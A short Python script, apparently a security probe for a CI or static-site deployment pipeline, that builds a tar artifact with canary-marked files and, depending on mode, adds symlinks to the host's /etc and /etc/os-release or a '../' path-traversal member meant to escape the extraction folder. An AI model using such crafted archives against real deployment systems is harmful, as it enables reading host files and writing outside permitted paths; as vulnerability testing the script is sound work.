
import io, os, sys, tarfile, time
mode = sys.argv[1]; canary = sys.argv[2]; rand = sys.argv[3]
out = os.path.join(os.environ["RUNNER_TEMP"], "artifact.tar")
t = tarfile.open(out, "w", format=tarfile.GNU_FORMAT)
now = int(time.time())
def reg(name, data, m=0o644):
    ti = tarfile.TarInfo(name); ti.size = len(data); ti.mode = m; ti.mtime = now
    ti.uid = ti.gid = 0; ti.uname = ti.gname = ""
    t.addfile(ti, io.BytesIO(data))
def sym(name, target):
    ti = tarfile.TarInfo(name); ti.type = tarfile.SYMTYPE; ti.linkname = target
    ti.mode = 0o777; ti.mtime = now; ti.size = 0
    ti.uid = ti.gid = 0; ti.uname = ti.gname = ""
    t.addfile(ti)
reg("./index.html", ("<html>INDEX " + canary + "</html>\n").encode())
reg("./control.txt", ("REGULAR-CONTROL " + canary + "\n").encode())
if mode == "a0":
    reg("./hostlink.txt", ("A0-DEREFERENCED-REGULAR " + canary + "\n").encode())
elif mode == "a1":
    sym("./hostlink.txt", "/etc/os-release")
    sym("./hostdir", "/etc")
elif mode == "a2":
    reg("./hostlink.txt", ("A2-REGULAR " + canary + "\n").encode())
    reg("./../pgesc-" + rand + ".txt", ("ESCAPED-TRAVERSAL " + canary + "\n").encode())
t.close()
print("=== MEMBERS WRITTEN ===")
for m2 in tarfile.open(out).getmembers():
    kind = "SYMLINK" if m2.issym() else ("LINK" if m2.islnk() else ("dir" if m2.isdir() else "file"))
    print("  %-8s %-34s size=%-6d link=%s" % (kind, m2.name, m2.size, m2.linkname))
print("=== artifact.tar bytes:", os.path.getsize(out))
